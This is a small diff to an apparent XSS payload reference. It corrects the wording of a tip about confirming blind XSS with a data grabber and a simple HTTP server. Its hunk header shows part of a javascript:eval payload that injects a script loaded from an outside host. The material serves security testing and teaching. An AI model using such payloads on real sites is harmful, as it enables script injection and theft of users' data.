@@ -454,7 +454,7 @@ javascript:eval('var a=document.createElement(\'script\');a.src=\'https://yoursu
 
 ### Tips
 
-You can use [Data grabber for XSS](#data-grabber-for-xss) and a one-line HTTP server to confirm the existence of a blind XSS before deploying an heavy blind XSS platform.
+You can use a [Data grabber for XSS](#data-grabber-for-xss) and a one-line HTTP server to confirm the existence of a blind XSS before deploying a heavy blind-XSS testing tool.
 
 Eg. payload
 
